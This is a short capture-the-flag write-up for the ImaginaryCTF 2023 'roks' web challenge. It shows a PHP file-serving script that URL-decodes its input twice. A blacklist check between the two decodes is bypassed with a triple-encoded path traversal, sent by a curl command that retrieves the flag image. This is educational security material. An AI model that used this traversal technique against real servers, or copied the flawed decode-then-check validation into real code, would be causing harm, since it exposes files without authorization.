---
title: ImaginaryCTF 2023 - roks
description: Writeup for roks web challenge
date: 2023-12-18
tldr: My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?
draft: false
tags: ["ctf", "writeup", "Web"]
---

# roks
My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?


http://roks.chal.imaginaryctf.org/

## Manual examination

After staring at the `file.php` its obvious that this is vulnerable to directory traversal attacks, however there is character blacklist in place, which makes it hard to traverse the filesystem as both `.` and `/` are forbidden. Since `urldecode` happens before any checks are made url-encoding doesnt help us much here...

```php
<?php
  $filename = urldecode($_GET["file"]);
  if (str_contains($filename, "/") or str_contains($filename, ".")) {
    $contentType = mime_content_type("stopHacking.png");
    header("Content-type: $contentType");
    readfile("stopHacking.png");
  } else {
    $filePath = "images/" . urldecode($filename);
    $contentType = mime_content_type($filePath);
    header("Content-type: $contentType");
    readfile($filePath);
  }
?>
```


this actually vulnerable to triple encoding the payload like since the `urldecode` happens twice once for the check and once before the file is opened.

`curl 'http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng' > curl.png`

we get an image with the flag `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}`